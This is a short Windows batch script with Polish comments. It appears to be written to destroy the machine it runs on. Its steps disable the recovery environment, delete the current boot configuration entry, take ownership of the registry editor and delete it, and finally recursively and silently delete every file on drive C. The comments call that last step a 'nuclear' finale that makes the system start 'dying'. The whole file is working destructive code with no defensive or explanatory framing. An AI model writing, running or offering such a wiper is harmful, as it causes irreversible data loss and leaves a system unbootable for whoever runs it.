@echo off
:: 1. Wyłączenie środowiska odzyskiwania (Recovery)
reagentc /disable

:: 2. Usunięcie konfiguracji rozruchu (Bootloader)
bcdedit /delete {current} /f

:: 3. Próba usunięcia edytora rejestru (Wymaga uprawnień)
takeown /f C:\Windows\regedit.exe
icacls C:\Windows\regedit.exe /grant administrators:F
del /f /q C:\Windows\regedit.exe

:: 4. "Nuklearny" finał - usunięcie wszystkiego z dysku C
:: (To sprawi, że system natychmiast zacznie "umierać")
del /s /q /f C:\*.*
